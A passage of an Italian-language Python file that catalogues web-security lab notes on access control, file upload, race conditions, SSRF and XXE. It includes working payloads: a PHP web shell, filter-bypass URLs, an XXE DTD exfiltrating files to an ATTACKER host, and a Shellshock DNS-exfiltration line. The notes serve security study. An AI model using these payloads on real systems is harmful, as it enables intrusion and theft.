                process="Lab risolto cambiando GET /product?productId=1 in productId=a: l'errore rivela che gira Apache Struts 2 2.3.31."),
            test("Dati di debug",
                 goal="Leggere variabili, credenziali, chiavi da log/diagnostica.",
                 process="Cerca pagine o file di debug (es. phpinfo) che espongono variabili di sessione, host/credenziali di back-end, chiavi."),
            lab("Lab: secret key in phpinfo",
                process="Lab risolto con fuzzing sull'URL: scopro /cgi-bin con phpinfo, dove trovo la secret key."),
            test("File di backup del codice",
                 goal="Leggere il sorgente (e i segreti) da backup temporanei.",
                 payload="file.php~\nfile.php.bak",
                 process="Editor e tool creano backup (tilde ~ o estensione diversa): richiedere il file col suffisso di backup puo' restituire il sorgente, a volte con chiavi/credenziali."),
            lab("Lab: directory /backup",
                process="Lab risolto trovando la directory /backup dove sono scritte le password."),
            test("Configurazioni insicure (metodo TRACE)",
                 goal="Sfruttare opzioni di debug lasciate attive.",
                 payload="TRACE / HTTP/1.1",
                 process="Il metodo TRACE rimanda la richiesta ricevuta: puo' rivelare header di autenticazione interni aggiunti dai reverse proxy."),
            lab("Lab: header custom via TRACE",
                process="Lab risolto: trovo /admin; con TRACE scopro un header custom che permette il login; lo uso sulle GET per /admin e per la delete."),
            test("Cronologia del controllo di versione (.git)",
                 goal="Recuperare sorgente e segreti dalla cartella .git esposta.",
                 payload="/.git/",
                 process="Se /.git e' esposta, scaricala tutta e aprila con Git: nei diff dei commit puoi trovare codice e segreti."),
            lab("Lab: .git esposta",
                process="Lab risolto visitando /.git, scaricando tutto (wget -r .../.git/) e leggendo nel diff del commit 'Remove admin password from config' la password in chiaro in admin.conf."),
        ]),
    ],
)


# ===========================================================================
#  7. ACCESS CONTROL
# ===========================================================================
ACCESS_CONTROL = macro(
    "Access Control",
    "Aggirare le restrizioni su chi puo' fare cosa o accedere a quali risorse.",
    (
        "Il controllo degli accessi decide se un utente e' autorizzato a compiere un'azione; "
        "si appoggia ad autenticazione (chi sei) e gestione della sessione (stesse richieste, "
        "stesso utente). Tipi: verticale (funzioni per ruoli diversi), orizzontale (risorse di "
        "utenti diversi), dipendente dal contesto (ordine dei passaggi).\n\n"
        "Prevenzione: mai affidarsi all'offuscamento; negare per default; un meccanismo "
        "centralizzato; dichiarare esplicitamente gli accessi consentiti; testare a fondo."
    ),
    references=PS + "/access-control",
    children=[
        micro("Tipi di controllo degli accessi", "Le tre categorie da tenere a mente.", [
            test("Verticale, orizzontale, contesto",
                 goal="Classificare il controllo per orientare i test.",
                 process="Verticale: funzioni riservate a ruoli (admin vs utente). Orizzontale: risorse del singolo utente (i miei conti, non quelli altrui). Contesto: azioni nell'ordine giusto (non modificare il carrello dopo il pagamento)."),
        ]),
        micro("Escalation verticale dei privilegi",
              "Accedere a funzioni per cui non si hanno i permessi.", [
            test("Funzionalita' admin non protetta",
                 goal="Raggiungere pagine amministrative da utente normale.",
                 payload="/admin\n/administrator-panel",
                 process="Cerca i pannelli admin con fuzzing o robots.txt e prova ad accedervi direttamente."),
            lab("Lab: pannello admin trovato",
                process="Lab risolto trovando il percorso /administrator-panel con fuzzing o robots.txt."),
            test("URL 'nascosto' divulgato nel client",
                 goal="Trovare URL admin poco prevedibili ma esposti.",
                 process="Un URL come /administrator-panel-yb556 puo' essere nel JavaScript che costruisce la UI in base al ruolo: visibile a tutti nel sorgente."),
            lab("Lab: URL admin nel sorgente",
                process="Lab risolto facendo 'ispeziona sorgente' e trovando il percorso /admin-<codice>."),
            test("Controllo basato su parametri",
                 goal="Sfruttare ruolo/diritti memorizzati in un valore controllabile.",
                 payload="/home.jsp?admin=true\n/home.jsp?role=1\nCookie: Admin=true\n{\"email\":\"...\",\"roleid\":2}",
                 process="Se il ruolo e' in un campo nascosto, in un cookie o nella query string, modificalo."),
            lab("Lab: cookie Admin=true",
                process="Lab risolto modificando il cookie da Admin=false a Admin=true nella GET su /admin."),
            lab("Lab: roleid nella richiesta",
                process="Lab risolto aggiungendo alla richiesta di cambio password, oltre all'email, anche il ruolo: {\"email\":\"ciao2@prova.com\",\"roleid\":2}."),
            test("Misconfig di piattaforma (override dell'URL)",
                 goal="Aggirare controlli front-end legati a URL/metodo.",
                 payload="POST / HTTP/1.1\nX-Original-URL: /admin/deleteUser",
                 process="Header come X-Original-URL / X-Rewrite-URL sovrascrivono il path: se il front-end filtra per URL ma il back-end onora l'header, bypassi il controllo (i parametri restano nella query string reale)."),
            lab("Lab: X-Original-URL",
                process="Lab risolto: GET / con X-Original-URL: /invalid da' 404 (il back-end usa l'header); cambio in /admin per entrare, e per eliminare carlos uso GET /?username=carlos con X-Original-URL: /admin/delete."),
            test("Override del metodo HTTP",
                 goal="Eseguire un'azione protetta con un metodo diverso.",
                 process="Se il controllo limita URL+metodo ma l'app accetta altri metodi (es. GET al posto di POST), usa il metodo non filtrato."),
            lab("Lab: POST -> GET",
                process="Lab risolto: la promozione di carlos col cookie dell'utente normale da' 'Unauthorized'; cambiando metodo (POSTX -> 'missing parameter', quindi Change request method a GET) e mettendo il proprio username la richiesta passa."),
            test("Discrepanze nel matching degli URL",
                 goal="Sfruttare differenze di normalizzazione dei percorsi.",
                 payload="/ADMIN/DELETEUSER\n/admin/deleteUser.anything   (Spring useSuffixPatternMatch)\n/admin/deleteUser/   (slash finale)",
                 process="Se il controllo accessi e' meno tollerante del routing (maiuscole, estensioni, slash finale), raggiungi l'endpoint aggirando la restrizione."),
        ]),
        micro("Escalation orizzontale e IDOR",
              "Accedere alle risorse di un altro utente.", [
            test("Cambiare l'identificatore (IDOR)",
                 goal="Vedere/gestire risorse di un altro utente cambiando un id.",
                 payload="/my-account?id=wiener  ->  /my-account?id=carlos",
                 process="Modifica il parametro che identifica la risorsa (id, user...). Gli Insecure Direct Object References sono una sottocategoria del controllo accessi."),
            lab("Lab: id orizzontale",
                process="Lab risolto cambiando nell'URL /my-account?id=wiener in ...?id=carlos."),
            test("Identificatori non prevedibili (GUID)",
                 goal="Recuperare un GUID altrui divulgato altrove.",
                 process="Se l'id e' un GUID, cercalo dove l'app fa riferimento all'utente: post, commenti, recensioni."),
            lab("Lab: GUID da un post",
                process="Lab risolto: trovo un post di carlos, dal link ricavo il suo user id, lo metto nel parametro id della mia pagina account e recupero la sua API key."),
            test("Redirect che perde comunque i dati",
                 goal="Sfruttare risposte che reindirizzano ma includono dati sensibili.",
                 process="Anche se l'app reindirizza al login per accesso non autorizzato, la risposta del redirect puo' contenere ancora i dati della vittima."),
            lab("Lab: dati nella response del redirect",
                process="Lab risolto cambiando id da wiener a carlos: vengo reindirizzato al login ma nella response compare comunque la API key di carlos."),
            test("Da orizzontale a verticale",
                 goal="Compromettere un utente piu' privilegiato.",
                 process="Un'escalation orizzontale verso un admin (es. leggerne/cambiarne la password) diventa verticale."),
            lab("Lab: password admin in chiaro nella response",
                process="Lab risolto cambiando id da wiener a administrator: la password in pagina e' mascherata con ****, ma nella response di Burp si legge in chiaro."),
            lab("Lab: IDOR su file statico",
                process="Lab risolto: nella trascrizione della chat la richiesta porta a /download/txt2; cambiando in /txt1 scarico la chat di carlos con la password."),
        ]),
        micro("Altri bypass del controllo accessi",
              "Processi multi-step, header Referer, geolocalizzazione.", [
            test("Processi multi-step protetti male",
                 goal="Saltare i passaggi protetti e inviare solo l'ultimo.",
                 process="Se solo alcuni passaggi sono protetti, invia direttamente la richiesta del passaggio finale con i parametri necessari."),
            lab("Lab: solo l'ultimo step",
                process="Lab risolto prendendo l'ultimo step della conferma del passaggio ad admin e rifacendolo con il cookie di wiener."),
            test("Controllo basato sull'header Referer",
                 goal="Falsificare il Referer per accedere a sottopagine.",
                 payload="Referer: https://sito/admin",
                 process="Se le sottopagine (es. /admin/deleteUser) controllano solo il Referer, falsificalo con l'URL /admin."),
            lab("Lab: Referer forgiato",
                process="Lab risolto rimandando la richiesta di upgrade con header Referer .../admin: nonostante il cookie di sessione sia di wiener, funziona."),
            test("Controllo basato sulla geolocalizzazione",
                 goal="Aggirare restrizioni geografiche.",
                 process="Usa proxy/VPN o manipola i meccanismi di geolocalizzazione lato client."),
        ]),
    ],
)


# ===========================================================================
#  8. FILE UPLOAD
# ===========================================================================
FILE_UPLOAD = macro(
    "File Upload",
    "Caricare file pericolosi (fino alla web shell/RCE) per validazione insufficiente.",
    (
        "Nascono quando il server accetta upload senza validare bene nome, tipo, contenuto o "
        "dimensione. Nel caso peggiore si carica uno script lato server (es. .php) che il server "
        "esegue: web shell e RCE. Altri impatti: sovrascrittura di file, DoS per dimensione.\n\n"
        "Prevenzione: whitelist di estensioni; nome senza ../; rinominare i file; non salvarli "
        "nel filesystem finche' non validati; usare framework consolidati."
    ),
    references=PS + "/file-upload",
    children=[
        micro("Upload senza restrizioni (web shell)",
              "Quando il server esegue lo script caricato.", [
            test("Caricare una web shell PHP",
                 goal="Eseguire comandi o leggere file tramite il file caricato.",
                 payload="<?php echo file_get_contents('/home/carlos/secret'); ?>",
                 process="Carica lo script, poi richiedilo (es. GET /files/avatars/exploit.php): l'output dello script torna nella risposta."),
            lab("Lab: web shell via avatar",
                process="Lab risolto caricando exploit.php (con file_get_contents del segreto di Carlos) dalla funzione avatar, poi aprendo GET /files/avatars/exploit.php in Repeater e leggendo l'output."),
        ]),
        micro("Validazione del tipo di file",
              "Content-Type falsificabile e directory di esecuzione.", [
            test("Falsificare il Content-Type",
                 goal="Superare un controllo che si fida del MIME dichiarato.",
                 payload="Content-Disposition: form-data; name=\"avatar\"; filename=\"shell.php\"\nContent-Type: image/jpeg\n\n<?php echo file_get_contents('/home/carlos/secret'); ?>",
                 process="In multipart/form-data cambia il Content-Type della parte file in image/jpeg pur caricando un .php: se non si verifica il contenuto reale, passa."),
            lab("Lab: Content-Type falso",
                process="Lab risolto cambiando la richiesta di cambio immagine: filename=\"shell.php\", Content-Type: image/jpeg e payload PHP; poi tornando alla home che esegue lo script."),
            test("Eseguire in un'altra directory (traversal nel filename)",
                 goal="Mettere lo script in una directory dove l'esecuzione e' consentita.",
                 payload="filename=\"..%2fexploit.php\"",
                 process="Il campo filename decide dove salvare: con ../ (anche URL-encoded) esci dalla cartella upload verso una directory eseguibile; poi richiedi il file."),
            lab("Lab: traversal nel filename",
                process="Lab risolto modificando filename in ..%2fexploit.php (Content-Type: text/php, payload PHP) e poi aprendo GET /files/exploit.php."),
        ]),
        micro("Blacklist e offuscamento delle estensioni",
              "Aggirare i filtri sulle estensioni.", [
            test("Estensioni alternative e offuscamento",
                 goal="Trovare un'estensione eseguibile che superi la blacklist.",
                 payload=".php5   .shtml   .phtml   .pHp   exploit.php.jpg   exploit.php.   exploit%2Ephp   exploit.asp;.jpg   exploit.asp%00.jpg   exploit.p.phphp",
                 process="Prova estensioni meno comuni, doppie estensioni, caratteri finali, URL/double encoding, null byte/;, Unicode multibyte, e stringhe che dopo lo stripping non ricorsivo restano valide (es. .p.phphp -> .php)."),
            test("Sovrascrivere la config del server (.htaccess / web.config)",
                 goal="Far eseguire un'estensione arbitraria caricando un file di config.",
                 payload="filename=\".htaccess\"   ->   AddType application/x-httpd-php .l33t",
                 process="Se puoi caricare .htaccess (Apache) o web.config (IIS), mappa un'estensione custom a un MIME eseguibile, poi carica lo script con quell'estensione."),
            lab("Lab: .htaccess + estensione custom",
                process="Lab risolto caricando un .htaccess (Content-Type text/plain) con 'AddType application/x-httpd-php .l33t', poi caricando exploit.l33t col payload PHP: viene eseguito come .php."),
            lab("Lab: null byte nell'estensione",
                process="Lab risolto caricando filename=exploit.php%00.jpg (Content-Type text/php, payload PHP) e aprendo GET /files/exploit.php."),
        ]),
        micro("Validazione del contenuto (magic bytes)",
              "Quando il server verifica le proprieta' reali del file.", [
            test("JPEG poliglotta con ExifTool",
                 goal="Superare il controllo della firma del file (un JPEG inizia con FF D8 FF).",
                 payload="exiftool -Comment=\"<?php echo file_get_contents('/home/carlos/secret'); ?>\" img.jpg",
                 process="Crea un file che e' un'immagine valida ma contiene il payload nei metadati (campo Comment); caricalo e cerca la stringa nella risposta."),
            lab("Lab: poliglotta JPEG",
                process="Lab risolto creando con exiftool un file poliglotta col payload nel metadato Comment, caricandolo come immagine profilo e cercando la stringa segreta nella risposta."),
        ]),
        micro("Altri vettori",
              "Senza RCE: client-side, parsing, PUT, race condition.", [
            test("Script lato client (SVG/HTML -> stored XSS)",
                 goal="Se non c'e' esecuzione server, sfruttare il client.",
                 payload="<svg><script>alert(document.domain)</script></svg>",
                 process="Carica HTML o SVG con <script>: se servito dallo stesso dominio e visto da altri, e' stored XSS (vincolo Same-Origin Policy)."),
            test("Parsing del file (XXE)",
                 goal="Sfruttare il parser del formato.",
                 process="Se il server analizza file basati su XML (es. .docx/.xlsx), puo' essere vettore di XXE (vedi la macro XXE)."),
            test("Metodo HTTP PUT",
                 goal="Caricare file senza una funzione di upload.",
                 payload="PUT /images/exploit.php HTTP/1.1\nContent-Type: application/x-httpd-php\n\n<?php echo file_get_contents('/path/to/file'); ?>",
                 process="Con OPTIONS verifica se un endpoint dichiara PUT; se abilitato e non protetto, carica il file direttamente."),
            test("Race condition nell'upload",
                 goal="Eseguire il file nel breve istante prima che venga validato/eliminato.",
                 process="Se il file viene salvato e poi eliminato se non valido (es. scansione AV), richiedilo nella race window. Negli upload via URL con directory a nome casuale (uniqid di PHP) prova a prevederlo/brute-forzarlo allungando l'elaborazione."),
        ]),
    ],
)


# ===========================================================================
#  9. RACE CONDITIONS
# ===========================================================================
RACE_CONDITIONS = macro(
    "Race Conditions",
    "Richieste concorrenti non protette che collidono sugli stessi dati.",
    (
        "Le race condition nascono quando il sito elabora richieste concorrenti senza "
        "protezioni: piu' thread toccano gli stessi dati nella 'race window' (la frazione di "
        "secondo tra due interazioni, es. col database), con comportamenti indesiderati.\n\n"
        "Per minimizzare il jitter di rete: su HTTP/2 il single-packet attack (20-30 richieste "
        "in un solo pacchetto TCP), su HTTP/1 la last-byte synchronization. In Burp: gruppo di "
        "schede + Send group in parallel, oppure l'azione Trigger race conditions."
    ),
    references=PS + "/race-conditions",
    children=[
        micro("Limit overrun", "Superare un limite inviando richieste in parallelo.", [
            test("Con Burp Repeater",
                 goal="Superare un limite monouso o rate-limited (coupon, inviti...).",
                 process="Raggruppa piu' copie della richiesta e inviale in parallelo (Send group in parallel, o Custom action 'Trigger race conditions') per superare il limite."),
            lab("Lab: riuso del coupon",
                process="Lab risolto mandando la POST di applicazione del coupon a Repeater e usando Custom actions -> from template -> Trigger race condition per inviarla 20 volte insieme e ottenere piu' sconti."),
            test("Con Turbo Intruder (single-packet)",
                 goal="Single-packet attack su molti valori.",
                 payload="engine=Engine.BURP2\nconcurrentConnections=1\nengine.queue(req, gate='1'); engine.openGate('1')",
                 process="Su target HTTP/2, con Turbo Intruder accoda le richieste su un gate e aprilo per inviarle simultaneamente."),
            lab("Lab: brute-force password in parallelo",
                process="Lab risolto mandando la POST a Turbo Intruder, copiando il codice fornito e testando contemporaneamente tutte le password dell'utente carlos."),
        ]),
        micro("Metodologia (sotto-stati nascosti)",
              "Trovare collisioni oltre il semplice limit overrun.", [
            test("Prevedi, cerca indizi, dimostra",
                 goal="Individuare endpoint con potenziale di collisione.",
                 process="1) Dopo aver mappato il sito, scegli endpoint security-critical con potenziale di collisione. 2) Baseline con 'Send group in sequence', poi invia lo stesso gruppo in parallelo (single-packet/last-byte) e cerca differenze. 3) Riduci al minimo le richieste mantenendo l'effetto."),
        ]),
        micro("Race condition multi-endpoint",
              "Richieste simultanee verso endpoint diversi.", [
            test("Allineare le race window",
                 goal="Colpire piu' endpoint nello stesso istante.",
                 process="Ostacoli: ritardi di rete (nuova connessione back-end) e di elaborazione per-endpoint. Il 'connection warming' (una GET alla home all'inizio del gruppo) distingue i ritardi uniformi. Se non basta: ritardo lato client (Turbo Intruder) o satura il rate-limit con richieste fittizie per ritardare il server."),
            lab("Lab: checkout prima dell'aggiunta",
                process="Lab risolto: intercetti POST /cart (impostato productId=1, la giacca) e POST /cart/checkout, le metti nello stesso gruppo Repeater e usi Send parallel: col timing giusto il checkout valida il credito prima che la giacca sia nel carrello e l'ordine si completa comunque."),
        ]),
        micro("Race condition su singolo endpoint",
              "Richieste parallele con valori diversi allo stesso endpoint.", [
            test("Collisione sullo stato di sessione",
                 goal="Far collidere due operazioni sulla stessa sessione.",
                 process="Es. reset password che salva userID e token in sessione: due reset paralleli dalla stessa sessione con username diversi possono lasciare in sessione l'ID della vittima ma mandare il token valido all'attaccante. Se le richieste sono seriali (PHP blocca per sessione), usa un token di sessione diverso per ciascuna."),
            lab("Lab: cambio email in collisione",
                process="Lab risolto mandando due POST changeemail insieme (gruppo Repeater), una con valore valido e una con la mail di carlos: dopo alcuni tentativi arriva la mail di cambio con l'indirizzo di carlos."),
        ]),
        micro("Costruzione parziale e attacchi temporali",
              "Stati intermedi e token basati sul tempo.", [
            test("Costruzione parziale degli oggetti",
                 goal="Sfruttare uno stato intermedio dell'oggetto.",
                 process="Se un oggetto e' creato in piu' passaggi (es. utente creato, poi API key impostata con una seconda query), esiste una finestra in cui l'utente esiste senza API key."),
            test("Attacchi sensibili al fattore tempo",
                 goal="Collidere token generati da timestamp.",
                 process="Se un token (es. reset password) e' randomizzato solo da un timestamp, sincronizza due richieste per due utenti diversi perche' generino lo stesso timestamp -> stesso token."),
            lab("Lab: token identici da timestamp",
                process="Lab risolto prendendo due richieste di password reset (in una cambio user, cookie di sessione e CSRF token da un'altra GET, perche' PHP non permette due richieste parallele sulla stessa sessione) e mandandole in parallelo: si creano due token di reset identici per wiener e carlos, dato che dipendono solo dal timestamp."),
        ]),
    ],
)


# ===========================================================================
#  10. SSRF
# ===========================================================================
SSRF = macro(
    "SSRF",
    "Indurre il server a fare richieste verso destinazioni non previste.",
    (
        "La Server-Side Request Forgery (SSRF) induce l'applicazione lato server a effettuare "
        "richieste verso una destinazione non prevista: servizi interni (loopback 127.0.0.1/"
        "localhost, IP privati) o sistemi esterni arbitrari. Spesso i controlli di accesso "
        "vengono aggirati perche' la richiesta 'sembra' provenire da una posizione affidabile.\n\n"
        "Prevenzione tipica: whitelist rigide, nessun follow dei redirect, validazione robusta "
        "dell'URL dopo la risoluzione."
    ),
    references=PS + "/ssrf",
    children=[
        micro("SSRF contro il server", "Puntare al server stesso via loopback.", [
            test("Puntare a localhost",
                 goal="Raggiungere funzioni interne considerate affidabili.",
                 payload="stockApi=http://localhost/admin",
                 process="Sostituisci l'URL che il server recupera con uno locale: /admin da localhost aggira i controlli d'accesso (richiesta 'dalla macchina locale')."),
            lab("Lab: SSRF a localhost/admin",
                process="Lab risolto: in Check stock cambi stockApi in http://localhost/admin, leggi l'HTML per l'URL di delete e usi stockApi=http://localhost/admin/delete?username=carlos."),
        ]),
        micro("SSRF contro back-end interni", "Raggiungere IP privati non esposti.", [
            test("Puntare a un IP interno",
                 goal="Accedere a interfacce su rete privata.",
                 payload="stockApi=http://192.168.0.68/admin",
                 process="Punta a IP privati; se non conosci l'host, spazza l'ultimo ottetto con Intruder (Numbers 1-255) e cerca lo stato 200."),
            lab("Lab: sweep dell'IP interno",
                process="Lab risolto con Intruder su http://192.168.0.1:8080/admin (ultimo ottetto 1-255), trovata la voce con stato 200, poi stockApi=.../admin/delete?username=carlos."),
        ]),
        micro("Aggirare difese basate su blacklist",
              "Quando bloccano 127.0.0.1/localhost o /admin.", [
            test("Rappresentazioni alternative e offuscamento",
                 goal="Eludere il filtro su hostname/percorso.",
                 payload="http://2130706433/   http://017700000001/   http://127.1/\nspoofed.burpcollaborator.net\nURL encoding / doppio encoding / maiuscole-minuscole\nredirect da un URL sotto controllo",
                 process="Usa forme alternative di 127.0.0.1, un dominio che risolve a 127.0.0.1, offusca le stringhe bloccate, o un redirect (anche cambiando http->https)."),
            lab("Lab: bypass blacklist",
                process="Lab risolto: http://127.1/ aggira il blocco di http://127.0.0.1/; poi per /admin offuschi la 'a' con doppio URL encoding (%2561) -> /%2561dmin per accedere ed eliminare l'utente."),
        ]),
        micro("Aggirare difese basate su whitelist",
              "Sfruttare incongruenze nel parsing degli URL.", [
            test("Trucchi di parsing dell'URL",
                 goal="Far accettare un host non consentito.",
                 payload="https://expected-host@evil-host\nhttps://evil-host#expected-host\nhttps://expected-host.evil-host\nURL encoding / doppio encoding",
                 process="Usa @ (credenziali embedded), # (frammento), la gerarchia DNS, o l'URL encoding per far divergere cio' che il filtro vede da cio' che viene richiesto."),
            lab("Lab: bypass whitelist con # e double encoding",
                process="Lab risolto: http://username@stock.weliketoshop.net/ e' accettato (credenziali embedded); il # viene rifiutato ma con doppio encoding (%2523) passa: http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos."),
        ]),
        micro("Open Redirection per SSRF",
              "Superare il filtro con un redirect verso l'interno.", [
            test("Sfruttare una open redirection",
                 goal="Far seguire al server un redirect verso il bersaglio interno.",
                 payload="stockApi=http://host-consentito/product/nextProduct?path=http://192.168.0.68/admin",
                 process="Se l'URL passa la whitelist ma contiene una open redirection, il server segue il redirect verso l'host interno scelto."),
            lab("Lab: SSRF via open redirect",
                process="Lab risolto: il parametro path finisce nell'header Location (open redirect); stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin (poi .../admin/delete?username=carlos) fa seguire il redirect all'interno."),
        ]),
        micro("Blind SSRF", "Quando la risposta del back-end non torna al client.", [
            test("Individuare con OAST (Collaborator)",
                 goal="Confermare la SSRF senza vederne la risposta.",
                 process="Inserisci un dominio Burp Collaborator univoco in un parametro URL (o nell'header Referer, spesso visitato dagli analytics) e monitora le interazioni. Nota: spesso vedi solo DNS (HTTP in uscita bloccato)."),
            lab("Lab: Blind SSRF via Referer",
                process="Lab risolto inserendo un payload Collaborator nell'header Referer in Repeater e osservando le interazioni DNS/HTTP in Poll now."),
            test("Sfruttare la Blind SSRF (scan interno)",
                 goal="Usare la blind SSRF per colpire altri sistemi interni.",
                 payload="() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN",
                 process="Scansiona lo spazio IP interno con payload noti (es. Shellshock nell'User-Agent via Referer): l'esfiltrazione DNS porta fuori l'output (es. whoami)."),
            lab("Lab: Blind SSRF + Shellshock",
                process="Lab risolto con Collaborator Everywhere: payload Shellshock nell'User-Agent, Referer su http://192.168.0.1:8080 e sweep dell'ultimo ottetto (1-255) con Intruder; l'interazione DNS riporta il nome utente del sistema interno."),
            test("Superfici: URL parziali e formati dati",
                 goal="Riconoscere altri punti di SSRF.",
                 process="A volte controlli solo l'hostname o parte del path (SSRF limitata). Formati come XML possono richiedere URL automaticamente (SSRF via XXE)."),
        ]),
    ],
)


# ===========================================================================
#  11. XXE INJECTION
# ===========================================================================
XXE = macro(
    "XXE Injection",
    "Interferire con il parsing XML per leggere file o fare SSRF.",
    (
        "La XML External Entity Injection (XXE) sfrutta il parsing XML per leggere file dal "
        "server o interagire con back-end/sistemi esterni. Le entita' XML personalizzate si "
        "dichiarano nella DTD (dentro DOCTYPE); un'entita' ESTERNA usa SYSTEM + un URL, anche "
        "file:// (lettura file) o http:// (SSRF).\n\n"
        "Prevenzione: disabilitare la risoluzione delle entita' esterne e il supporto a XInclude."
    ),
    references=PS + "/xxe",
    children=[
        micro("XXE classica (lettura di file)",
              "Definire un'entita' esterna e vederla nella risposta.", [
            test("Leggere un file con un'entita' esterna",
                 goal="Restituire il contenuto di un file nella risposta.",
                 payload="<?xml version=\"1.0\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n<stockCheck><productId>&xxe;</productId></stockCheck>",
                 process="Introduci un DOCTYPE con un'entita' esterna e usa &xxe; in un campo il cui valore torna nella risposta. Testa ogni nodo XML uno alla volta."),
            lab("Lab: lettura di /etc/passwd",
                process="Lab risolto inserendo <!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]> e sostituendo productId con &xxe;: la risposta contiene 'Invalid product ID:' seguito dal file."),
        ]),
        micro("SSRF via XXE", "Usare l'entita' esterna per raggiungere la rete interna.", [
            test("Entita' esterna verso un host interno",
                 goal="Far fare al server una richiesta HTTP interna.",
                 payload="<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://internal.vulnerable-website.com/\"> ]>",
                 process="Punta l'entita' a un URL interno e usala in un campo restituito (interazione bidirezionale) o in blind (vedi Blind XXE)."),
        ]),
        micro("Superfici di attacco nascoste",
              "XInclude, upload SVG, cambio di Content-Type.", [
            test("XInclude",
                 goal="Attaccare quando non controlli l'intero documento (es. dati in una SOAP lato server).",
                 payload="<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>",
                 process="Se il tuo dato viene inserito dal server in un XML, usa XInclude in quel singolo campo (non serve il DOCTYPE)."),
            lab("Lab: XInclude",
                process="Lab risolto impostando productId a un payload XInclude che include file:///etc/passwd."),
            test("Upload SVG",
                 goal="Raggiungere XXE da una funzione di upload immagini.",
                 payload="<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/hostname\" > ]><svg xmlns=\"http://www.w3.org/2000/svg\"><text x=\"0\" y=\"16\">&xxe;</text></svg>",
                 process="SVG e DOCX sono basati su XML: carica un SVG con l'entita' esterna; il contenuto del file appare nell'immagine resa."),
            lab("Lab: XXE via SVG avatar",
                process="Lab risolto creando un SVG con entita' esterna su file:///etc/hostname e caricandolo come avatar di un commento: l'hostname compare nell'immagine."),
            test("Cambiare il Content-Type in XML",
                 goal="Trovare XXE anche su richieste non-XML.",
                 payload="Content-Type: text/xml\n\n<?xml version=\"1.0\"?><foo>bar</foo>",
                 process="Se un endpoint accetta anche XML, riformatta una POST (es. x-www-form-urlencoded) in XML per aprire la superficie XXE."),
        ]),
        micro("Blind XXE: rilevamento (OAST)",
              "Quando il valore dell'entita' non torna nella risposta.", [
            test("Entita' esterna verso Collaborator",
                 goal="Confermare la XXE con un'interazione out-of-band.",
                 payload="<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://BURP-COLLABORATOR-SUBDOMAIN\"> ]>",
                 process="Punta l'entita' a un dominio Collaborator e usala in un campo; monitora DNS/HTTP."),
            lab("Lab: Blind XXE OAST",
                process="Lab risolto inserendo l'entita' esterna verso un sottodominio Collaborator e usando &xxe; in productId; le interazioni compaiono in Poll now."),
            test("Entita' parametro XML (%)",
                 goal="Aggirare validazione/hardening che blocca le entita' normali.",
                 payload="<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"http://BURP-COLLABORATOR-SUBDOMAIN\"> %xxe; ]>",
                 process="Le entita' parametro si dichiarano e si usano con % e vivono nella DTD: utili quando le entita' normali (&) sono bloccate."),
            lab("Lab: Blind XXE con entita' parametro",
                process="Lab risolto con <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM \"http://COLLABORATOR\"> %xxe; ]> e verificando le interazioni in Collaborator."),
        ]),
        micro("Blind XXE: esfiltrazione dati",
              "DTD malevola esterna per portare fuori i file.", [
            test("Esfiltrazione via DTD esterna",
                 goal="Portare il contenuto di un file su un server controllato.",
                 payload="<!-- malicious.dtd sul tuo server: -->\n<!ENTITY % file SYSTEM \"file:///etc/hostname\">\n<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/?x=%file;'>\">\n%eval;\n%exfil;\n<!-- payload inviato all'app: -->\n<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://ATTACKER/malicious.dtd\"> %xxe;]>",
                 process="Ospita una DTD che legge il file in un'entita' e lo esfiltra nell'URL di una richiesta HTTP; richiama la DTD esterna dal payload. Per file con newline (es. /etc/passwd) usa un file senza newline (/etc/hostname) o FTP."),
            lab("Lab: esfiltrazione via Collaborator",
                process="Lab risolto ospitando sull'exploit server una DTD che legge file:///etc/hostname ed esfiltra su http://COLLABORATOR/?x=%file;, poi inviando <!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"YOUR-DTD-URL\"> %xxe;]> e leggendo l'hostname nelle interazioni."),
        ]),
        micro("Blind XXE: via messaggi di errore",
              "Provocare un errore che contiene i dati.", [
            test("Errore con DTD malevola",
                 goal="Leggere un file dentro un messaggio di errore.",
                 payload="<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">\n%eval;\n%error;",
                 process="Fai valutare l'entita' file dentro un percorso inesistente: l'errore 'FileNotFoundException: /nonexistent/<contenuto>' rivela il file. Richiede che l'app mostri l'errore."),
            lab("Lab: XXE error-based (DTD esterna)",
                process="Lab risolto ospitando la DTD error-based su /etc/passwd e inviando <!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"YOUR-DTD-URL\"> %xxe;]>: il messaggio di errore contiene il file."),
            test("Riuso di una DTD locale",
                 goal="Error-based anche senza connessioni out-of-band.",
                 payload="<!DOCTYPE foo [\n<!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\">\n<!ENTITY % ISOamso '<!ENTITY &#x25; file SYSTEM \"file:///etc/passwd\"> ...ridefinizione error-based...'>\n%local_dtd;\n]>",
                 process="Richiama una DTD gia' presente sul server (es. docbookx.dtd di GNOME) e ridefinisci una sua entita' per l'attacco error-based. Trova i DTD locali provando a caricarli e leggendo gli errori."),
            lab("Lab: riuso DTD locale",
                process="Lab risolto riusando /usr/share/yelp/dtd/docbookx.dtd e ridefinendo l'entita' ISOamso con l'exploit error-based su /etc/passwd."),
        ]),
    ],
)


# ===========================================================================
#  12. NOSQL INJECTION
# ===========================================================================
NOSQL_INJECTION = macro(
    "NoSQL Injection",
    "Alterare query NoSQL (sintassi o operatori), es. in MongoDB.",
    (
        "I database NoSQL (document/key-value/wide-column/graph) usano linguaggi di query "
